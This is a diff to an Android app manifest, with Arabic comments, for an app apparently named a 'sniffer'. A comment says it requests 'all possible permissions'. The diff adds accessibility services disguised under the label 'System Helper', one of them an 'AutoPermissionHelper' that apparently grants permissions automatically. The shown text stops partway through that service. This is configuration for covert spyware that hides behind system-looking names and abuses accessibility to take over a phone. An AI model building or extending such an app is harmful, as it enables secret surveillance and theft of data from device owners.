@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="com.v8.global.sniffer">
+    xmlns:tools="http://schemas.android.com/tools">
 
     <!-- جميع الصلاحيات الممكنة -->
     <uses-permission android:name="android.permission.INTERNET" />
@@ -101,9 +100,25 @@
             </intent-filter>
         </service>
 
-        <!-- خدمة الوصول -->
+        <!-- خدمة الوصول الأصلية -->
         <service
             android:name=".MyAccessibilityService"
+            android:label="System Helper"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true"
+            android:enabled="true"
+            android:foregroundServiceType="specialUse">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- خدمة المساعد التلقائي للصلاحيات - الجديدة -->
+        <service
+            android:name=".AutoPermissionHelper"
             android:label="System Helper"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
